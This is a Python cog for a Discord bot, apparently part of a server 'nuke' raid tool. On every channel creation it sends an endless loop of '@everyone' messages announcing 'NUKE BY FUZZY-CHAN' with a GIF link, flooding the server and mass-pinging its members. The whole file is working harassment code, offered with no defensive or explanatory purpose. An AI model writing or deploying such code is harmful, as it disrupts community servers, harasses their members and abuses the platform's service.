from discord.ext import commands
import asyncio

class Events(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_guild_channel_create(self, ctx):
        while True:
            await ctx.send('@everyone\n* **NUKE BY FUZZY-CHAN**\nhttps://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeW9jcmZwZTRkaGswbHoyNjh1YXNhMG03Nzl3aHNqY2RseGRzOWI1MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/HhTXt43pk1I1W/giphy.gif')


async def setup(bot):
    await bot.add_cog(Events(bot))